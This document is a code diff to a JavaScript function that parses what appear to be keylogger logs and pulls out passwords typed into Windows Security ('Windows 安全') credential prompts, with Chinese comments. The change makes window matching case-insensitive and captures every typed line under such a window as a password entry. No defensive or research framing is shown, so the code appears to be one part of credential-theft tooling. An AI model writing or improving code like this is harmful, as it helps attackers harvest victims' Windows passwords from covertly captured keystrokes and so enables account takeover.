@@ -1275,22 +1275,35 @@ function extractPasswordsFromLog(content, filename) {
     for (let i = 0; i < lines.length; i++) {
         const line = lines[i].trim();
         // 查找包含时间戳的行，且窗口标题包含 "Windows 安全" 或 "Windows 安全中心"
-        if (line.startsWith('[Window:') && (line.includes('Windows 安全') || line.includes('Windows 安全中心'))) {
+        const lowerLine = line.toLowerCase();
+        if (line.startsWith('[Window:') && (lowerLine.includes('windows 安全') || lowerLine.includes('windows 安全中心'))) {
             // 提取时间戳
             const timestampMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
             const timestamp = timestampMatch ? timestampMatch[1] : '未知';
             
-            // 检查下一行是否包含密码
-            if (i + 1 < lines.length) {
-                const nextLine = lines[i + 1].trim();
-                // 密码模式：非空行，可能包含字母、数字和特殊键
-                if (nextLine) {
-                    passwords.push({
-                        file: filename,
-                        timestamp: timestamp,
-                        password: nextLine
-                    });
+            // 提取该窗口下的所有密码行，直到遇到下一个窗口或文件结束
+            let j = i + 1;
+            let passwordLines = [];
+            while (j < lines.length) {
+                const currentLine = lines[j].trim();
+                // 如果遇到新的窗口行，停止提取
+                if (currentLine.startsWith('[Window:')) {
+                    break;
                 }
+                // 如果是密码行（非空且长度至少为3），添加到密码行列表
+                if (currentLine && currentLine.length >= 3) {
+                    passwordLines.push(currentLine);
+                }
+                j++;
+            }
+            
+            // 如果有密码行，将它们合并为一个条目
+            if (passwordLines.length > 0) {
+                passwords.push({
+                    file: filename,
+                    timestamp: timestamp,
+                    password: passwordLines.join('\n')
+                });
             }
         }
     }
